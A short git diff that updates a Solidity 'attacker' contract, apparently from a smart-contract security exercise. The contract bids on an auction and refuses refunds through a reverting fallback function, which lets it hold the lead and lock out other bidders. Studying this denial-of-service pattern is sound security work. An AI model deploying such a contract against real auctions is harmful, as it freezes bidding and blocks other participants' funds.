@@ -4,8 +4,10 @@ import "./auction.sol";
 
 contract attacker {
     auction auc;
-    
-    function attack(address addr) {
+        
+    function attacker() public payable {}
+
+    function attack(address addr) public  {
         auc = auction(addr);
         
         uint val = auc.getHighestBid();
@@ -13,7 +15,7 @@ contract attacker {
     }
     
     function() payable public {
-        if (auc.getCurrentLeader() == address(this)) throw;
+        if (auc.getCurrentLeader() == address(this)) revert();
     }
     
 }
